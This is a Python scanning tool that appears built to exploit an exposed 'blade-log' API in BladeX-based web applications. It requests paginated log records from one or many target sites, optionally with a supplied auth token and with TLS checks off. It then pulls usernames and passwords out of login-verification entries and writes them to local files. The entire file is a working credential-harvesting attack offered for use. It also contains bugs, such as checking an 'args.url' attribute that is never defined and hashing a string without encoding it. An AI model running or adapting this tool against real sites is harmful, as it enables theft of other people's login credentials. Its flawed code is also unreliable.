import logging,json,requests,argparse,sys,urllib3
from functools import reduce
from hashlib import md5
from urllib.parse import parse_qs


logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

def logo():
    print("""
                    __   .__    .___  .___      .__ 
      ____________ |  | _|__| __| _/__| _/____  |__|
     /  ___/\____ \|  |/ /  |/ __ |/ __ |\__  \ |  |
     \___ \ |  |_> >    <|  / /_/ / /_/ | / __ \|  |
    /____  >|   __/|__|_ \__\____ \____ |(____  /__|
         \/ |__|        \/       \/    \/     \/    
    """)
    print("""
    use: BladeX-Log API Scan
    author: Spkiddai
    github: https://github.com/spkiddai
    csdn: https://blog.csdn.net/u012994510
    """)

def parse_args():
    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " -u http://test.com")
    apigroup = parser.add_argument_group('API', 'URL AND API SET')
    apigroup.add_argument("-u", "--domain", help="Website domain")
    apigroup.add_argument("-a", "--auth", default=None,help='API Blade-Auth Example:x.py -u xx -a "bearer XXXXX"')
    apigroup.add_argument("-b", "--baseURL", default="api", help="API BaseURL Default:api")
    apigroup.add_argument("-c", "--custom",default="blade-log", help="API Custom URL Default:blade-log")
    apigroup.add_argument("-p", "--page", default=1 ,help="LogAPI Json Max Page Default:1", type=int)
    batchgroup = parser.add_argument_group('Batch', 'URL Batch Test')
    batchgroup.add_argument("-f", "--file", type=argparse.FileType('r', encoding='UTF-8'),help="URL FileName")
    batchgroup.add_argument("-o", "--out", default="result.txt",type=argparse.FileType('a', encoding='UTF-8'), help="Save FlieName Default:result.txt")
    datagroup = parser.add_argument_group('Data', 'Save Data')
    datagroup.add_argument("-r", "--read", help="Read API USER Date" ,action='store_true')
    return parser.parse_args()

def Extract_url(url,args):
    if url[0:7] != 'http://' and url[0:8] != 'https://':
        url = 'http://' + url
    api = '{}/{}/{}/api/list'.format(url.rstrip().rstrip("/"),args.baseURL,args.custom)
    return api

def Extract_json(data):
    data_list = []
    for login in data['data']['records']:
        if login['title'] == "登录用户验证":
            data_dict = dict([(k,v[0]) for k,v in parse_qs(login['params']).items()])
            if "username" in data_dict.keys() and "password" in data_dict.keys():
                logger.info("用户名密码数据:" + str(data_dict))
            data_list.append(data_dict)
    return data_list

def Request_api(url,auth):
    header = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)"}
    if auth != None:
        header.update({'Blade-Auth':auth})
    try:
        raw = requests.get(url, headers=header, timeout=3, verify=False)
        if raw.status_code == 200:
            data = json.loads(raw.text)
            if data['code'] == 200:
                return data
            else:
                logger.info("API Error Code:" + str(data['code']))
                logger.info(data)
                return None
        else:
            logger.info("Requests Error Code:" + str(raw.status_code))
            logger.info(raw.text)
            return None
    except:
        return None

def Get_api(url,auth):
    result = Request_api(url,auth)
    if result != None:
        maxpage = result['data']['pages']
        logger.info("Max Page:" + str(maxpage))
        return True
    else:
        return False

def Savedata(url,data_list):
    #列表中字典去重
    run_function = lambda x, y: x if y in x else x + [y]
    rdata_list = reduce(run_function, [[], ] + data_list)
    with open(md5(url) + ".txt", "a")as f:
        f.write(url+"\n")
        for rdata_dict in rdata_list:
            with open(md5(url)+".txt","a")as f:
                f.write(str(rdata_dict)+"\n")
            f.close()

def Getdata(url,args):
    max_page = int(args.page)
    min_page = 1
    data = []
    while min_page <= max_page:
        purl = url + "?current={}".format(str(min_page))
        logger.info("发起请求：" + purl)
        min_page += 1
        result = Request_api(purl, args.auth)
        data = data + Extract_json(result)
        Savedata(url, data)
    return


def Run(url,args):
    url = Extract_url(url,args)
    logger.info("URL地址:"+url)
    if Get_api(url,args.auth):
        if args.read == True:
            Getdata(url,args)
    else:
        return None

if __name__ == "__main__":
    logo()
    urllib3.disable_warnings()
    args = parse_args()
    if args.file != None:
        for u in args.file.readlines():
            u = u.rstrip()
            if Run(u,args) != None:
                args.out.write(u + "\n")
                args.out.close()
    elif args.url != None:
        Run(args.url,args)
    else:
        logger.error("Not Found URL")
        logger.info("usage: logscan.py [-h]")
        exit(0)